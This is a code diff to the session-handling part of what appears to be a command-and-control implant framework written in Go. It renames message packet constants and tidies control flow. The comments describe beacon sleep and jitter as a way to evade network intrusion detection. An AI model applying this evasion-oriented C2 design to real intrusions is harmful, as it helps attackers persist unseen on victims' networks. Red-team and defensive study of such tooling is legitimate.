@@ -107,13 +107,12 @@ func (s *Session) listen() {
 	if s.parent != nil {
 		atomic.StoreUint32(&s.done, flagClose)
 	}
-	s.wait()
-	for ; atomic.LoadUint32(&s.done) <= flagLast; s.wait() {
+	for s.wait(); atomic.LoadUint32(&s.done) <= flagLast; s.wait() {
 		if s.done == flagLast && s.parent == nil {
 			if s.parent != nil {
 				break
 			}
-			s.peek = &com.Packet{ID: MsgShutdown, Device: s.ID}
+			s.peek = &com.Packet{ID: MvShutdown, Device: s.ID}
 			atomic.StoreUint32(&s.mode, 0)
 			atomic.StoreUint32(&s.channel, 0)
 			atomic.StoreUint32(&s.done, flagOption)
@@ -143,8 +142,7 @@ func (s *Session) listen() {
 			}
 			break
 		}
-		c.Close()
-		if s.errors > maxErrors {
+		if c.Close(); s.errors > maxErrors {
 			break
 		}
 		select {
@@ -160,8 +158,7 @@ func (s *Session) shutdown() {
 	if s.Shutdown != nil {
 		s.s.events <- event{s: s, sFunc: s.Shutdown}
 	}
-	s.cancel()
-	if s.swarm != nil {
+	if s.cancel(); s.swarm != nil {
 		s.swarm.Close()
 	}
 	if s.done < flagOption {
@@ -238,7 +235,7 @@ func (s Session) IsChannel() bool {
 // SetJitter sets Jitter percentage of the Session's wake interval. This is a 0 to 100 percentage (inclusive) that
 // will determine any +/- time is added to the waiting period. This assists in evading IDS/NDS devices/systems. A
 // value of 0 will disable Jitter and any value over 100 will set the value to 100, which represents using Jitter 100%
-// of the time. If this is a Server-side Session, the new value will be sent to the Client in a MsgProfile Packet.
+// of the time. If this is a Server-side Session, the new value will be sent to the Client in a MvUpdate Packet.
 func (s *Session) SetJitter(j int) {
 	s.SetDuration(s.sleep, j)
 }
@@ -314,7 +311,7 @@ func (c *cluster) add(p *com.Packet) error {
 
 // SetSleep sets the wake interval period for this Session. This is the time value between connections to the C2
 // Server. This does NOT apply to channels. If this is a Server-side Session, the new value will be sent to the
-// Client in a MsgProfile Packet. This setting does not affect Jitter.
+// Client in a MvUpdate Packet. This setting does not affect Jitter.
 func (s *Session) SetSleep(t time.Duration) {
 	s.SetDuration(t, int(s.jitter))
 }
@@ -398,12 +395,12 @@ func (s *Session) next(i bool) (*com.Packet, error) {
 			if atomic.LoadUint32(&s.mode) == 1 {
 				s.wait()
 			}
-			return &com.Packet{ID: MsgPing, Device: s.ID, Tags: t}, nil
+			return &com.Packet{ID: MvNop, Device: s.ID, Tags: t}, nil
 		}
 		if i {
 			return nil, nil
 		}
-		return &com.Packet{ID: MsgSleep, Device: s.ID, Tags: t}, nil
+		return &com.Packet{ID: MvNop, Device: s.ID, Tags: t}, nil
 	}
 	var (
 		p   *com.Packet
@@ -473,7 +470,7 @@ func (s *Session) write(w bool, p *com.Packet) error {
 // connections to the C2 Server. This does NOT apply to channels. Jitter is a 0 to 100 percentage (inclusive) that
 // will determine any +/- time is added to the waiting period. This assists in evading IDS/NDS devices/systems. A
 // value of 0 will disable Jitter and any value over 100 will set the value to 100, which represents using Jitter 100%
-// of the time. If this is a Server-side Session, the new value will be sent to the Client in a MsgProfile Packet.
+// of the time. If this is a Server-side Session, the new value will be sent to the Client in a MvUpdate Packet.
 func (s *Session) SetDuration(t time.Duration, j int) {
 	switch {
 	case j < 0:
@@ -485,7 +482,7 @@ func (s *Session) SetDuration(t time.Duration, j int) {
 	}
 	s.sleep = t
 	if s.parent != nil {
-		n := &com.Packet{ID: MsgProfile, Device: s.Device.ID}
+		n := &com.Packet{ID: MvUpdate, Device: s.Device.ID}
 		n.WriteUint8(s.jitter)
 		n.WriteUint64(uint64(s.sleep))
 		n.Close()
